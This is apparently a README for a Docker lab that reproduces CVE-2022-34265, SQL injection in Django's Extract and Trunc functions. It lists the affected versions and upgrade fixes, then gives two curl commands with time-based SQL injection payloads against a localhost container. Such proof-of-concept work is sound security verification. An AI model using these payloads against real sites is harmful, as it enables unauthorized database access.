# CVE-2022-34265
## Usage
```bash
docker-compose build
docker-compose up -d
```
### Affected WS form plugin
- Django 3.2.x prior to 3.2.14 and Django 4.0.x prior to 4.0.6

### Countermeasure
- Update to Django 3.2.14 or higher.
- Update to Django 4.0.6 or higher.

### Environment
- Mac mini on Mac OS Ventura (13.0)

### Verification of the reported vulnerability
- Launch the container and go to [http://localhost:4131](http://localhost:4131) to check all is running
- Open a terminal and put the following commands: 
```bash
curl "http://localhost:4131/extract/?lookup_name=year%27%20FROM%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
curl "http://localhost:4131/trunc/?kind=year%27,%20start_datetime))%20OR%201=1;SELECT%20PG_SLEEP(5)--"
```
After the execution of one command, you should experience response delay greater that 5 seconds. This means that arbitrary SQL queries can be executed. This means that attacks are possible, and they can result in very dangerous one.
